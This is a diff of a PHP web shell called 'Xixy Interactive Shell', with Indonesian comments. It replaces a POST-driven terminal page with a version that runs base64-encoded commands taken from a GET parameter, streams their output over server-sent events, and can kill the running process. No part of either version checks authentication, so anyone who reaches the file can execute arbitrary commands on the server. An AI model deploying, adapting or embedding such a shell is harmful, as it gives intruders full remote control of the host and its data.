@@ -1,118 +1,100 @@
 <?php
+// Pastikan tidak ada spasi atau baris kosong sebelum tag php di atas!
+
 session_start();
+set_time_limit(0);
+header('X-Accel-Buffering: no');
 
-// Inisialisasi Current Working Directory
-if (!isset($_SESSION['cwd'])) {
-    $_SESSION['cwd'] = getcwd();
-}
+// Bersihkan buffer agar tidak mengganggu respon JSON atau SSE
+while (ob_get_level()) ob_end_clean();
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $cmd = $_POST['cmd'] ?? '';
-    $cwd = $_SESSION['cwd'];
-
-    // Penanganan khusus perintah 'cd'
-    if (preg_match('/^cd\s+(.+)/', $cmd, $match)) {
-        $dir = trim($match[1]);
-        $new_dir = ($dir[0] === '/') ? $dir : $cwd . '/' . $dir;
-        if (is_dir($new_dir)) {
-            $_SESSION['cwd'] = realpath($new_dir);
-            die("CWD_CHANGED:" . $_SESSION['cwd']);
+// --- 1. FITUR KILL PROCESS (Tombol STOP) ---
+if (isset($_POST['action']) && $_POST['action'] === 'kill') {
+    header('Content-Type: application/json');
+    
+    if (isset($_SESSION['current_pid'])) {
+        $pid = (int)$_SESSION['current_pid'];
+        
+        if ($pid > 0) {
+            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+                shell_exec("taskkill /F /PID $pid 2>&1");
+            } else {
+                shell_exec("kill -9 $pid 2>&1");
+            }
         }
-        die("Error: Directory not found.");
-    }
-
-    // Eksekusi menggunakan proc_open
-    $descriptorspec = array(
-        0 => array("pipe", "r"), // stdin
-        1 => array("pipe", "w"), // stdout
-        2 => array("pipe", "w")  // stderr
-    );
-
-    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
-
-    if (is_resource($process)) {
-        fclose($pipes[0]); // Tutup stdin karena kita tidak pakai input interaktif di sini
-
-        $stdout = stream_get_contents($pipes[1]);
-        fclose($pipes[1]);
-
-        $stderr = stream_get_contents($pipes[2]);
-        fclose($pipes[2]);
-
-        proc_close($process);
-
-        echo $stdout;
-        if ($stderr) echo "\n[Error/Stderr]:\n" . $stderr;
+        
+        unset($_SESSION['current_pid']);
+        echo json_encode(['status' => 'killed', 'pid' => $pid]);
     } else {
-        echo "Error: Could not open process.";
+        echo json_encode(['status' => 'no_active_process']);
     }
     exit;
 }
-?>
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <title>Xixy Interactive Shell</title>
-    <style>
-        body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
-        #terminal { width: 100%; max-width: 900px; margin: 0 auto; background: #000; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,65,0.1); border-radius: 5px; overflow: hidden; }
-        #output { height: 450px; overflow-y: auto; padding: 15px; white-space: pre-wrap; word-wrap: break-word; font-size: 14px; border-bottom: 1px solid #222; }
-        #input-line { display: flex; padding: 10px 15px; background: #050505; }
-        #prompt { color: #888; margin-right: 10px; font-weight: bold; white-space: nowrap; }
-        #cmd { background: transparent; border: none; color: #fff; font-family: inherit; font-size: 14px; width: 100%; outline: none; }
-        .cmd-history { color: #008f11; font-weight: bold; }
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; }
-    </style>
-</head>
-<body>
 
-<div id="terminal">
-    <div id="output">--- Xixy Pro Terminal Loaded (proc_open mode) ---
-Silakan ketik perintah (contoh: ls -la, uname -a, dsb)</div>
-    <div id="input-line">
-        <span id="prompt"><?php echo $_SESSION['cwd']; ?> $</span>
-        <input type="text" id="cmd" autofocus spellcheck="false">
-    </div>
-</div>
+// --- 2. VALIDASI POST (Menerima Perintah) ---
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
+    header('Content-Type: application/json');
+    // Simpan ke session untuk cadangan jika diperlukan
+    $_SESSION['last_command'] = $_POST['command']; 
+    echo json_encode(['status' => 'ready']);
+    exit;
+}
 
-<script>
-const outputDiv = document.getElementById('output');
-const cmdInput = document.getElementById('cmd');
-const promptSpan = document.getElementById('prompt');
+// --- 3. STREAM OUTPUT (SSE) ---
+if (isset($_GET['stream']) && isset($_GET['cmd'])) {
+    header('Content-Type: text/event-stream');
+    header('Cache-Control: no-cache');
+    header('Connection: keep-alive');
 
-cmdInput.addEventListener('keydown', async (e) => {
-    if (e.key === 'Enter') {
-        const fullCmd = cmdInput.value.trim();
-        if (!fullCmd) return;
-
-        // Tampilkan perintah di layar
-        outputDiv.innerHTML += `\n<span class="cmd-history">$ ${fullCmd}</span>\n`;
-        cmdInput.value = '';
-        outputDiv.scrollTop = outputDiv.scrollHeight;
-
-        try {
-            const formData = new FormData();
-            formData.append('cmd', fullCmd);
-
-            const response = await fetch('', { method: 'POST', body: formData });
-            const result = await response.text();
-
-            // Cek jika direktori berubah
-            if (result.startsWith('CWD_CHANGED:')) {
-                const newPath = result.replace('CWD_CHANGED:', '');
-                promptSpan.innerText = newPath + ' $';
-                outputDiv.innerHTML += `Changed directory to: ${newPath}\n`;
-            } else {
-                outputDiv.innerHTML += result + "\n";
-            }
-        } catch (err) {
-            outputDiv.innerHTML += `<span style="color:red">Connection Error: ${err}</span>\n`;
-        }
-        outputDiv.scrollTop = outputDiv.scrollHeight;
+    $cmd = base64_decode($_GET['cmd']);
+    
+    if (!$cmd) {
+        echo "data: Error: Command empty.\n\n";
+        echo "data: [DONE]\n\n";
+        exit;
     }
-});
-</script>
-</body>
-</html>
+
+    $descriptorspec = [
+       1 => ["pipe", "w"], 
+       2 => ["pipe", "w"]  
+    ];
+
+    $process = proc_open($cmd . " 2>&1", $descriptorspec, $pipes);
+
+    if (is_resource($process)) {
+        $status = proc_get_status($process);
+        $_SESSION['current_pid'] = $status['pid'];
+        
+        // PENTING: Tutup session lock agar POST 'kill' bisa masuk
+        session_write_close(); 
+
+        while (!feof($pipes[1])) {
+            $line = fgets($pipes[1]);
+            if ($line !== false) {
+                // rtrim agar format SSE data: \n\n tetap bersih
+                echo "data: " . htmlspecialchars(rtrim($line)) . "\n\n";
+            }
+            
+            flush();
+
+            // Cek jika koneksi user terputus (tab ditutup)
+            if (connection_aborted()) {
+                if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+                    shell_exec("kill -9 " . $status['pid']);
+                }
+                break;
+            }
+        }
+
+        fclose($pipes[1]);
+        proc_close($process);
+        
+        // Buka session lagi untuk hapus PID setelah selesai
+        session_start();
+        unset($_SESSION['current_pid']);
+        session_write_close();
+    }
+
+    echo "data: [DONE]\n\n";
+    exit;
+}
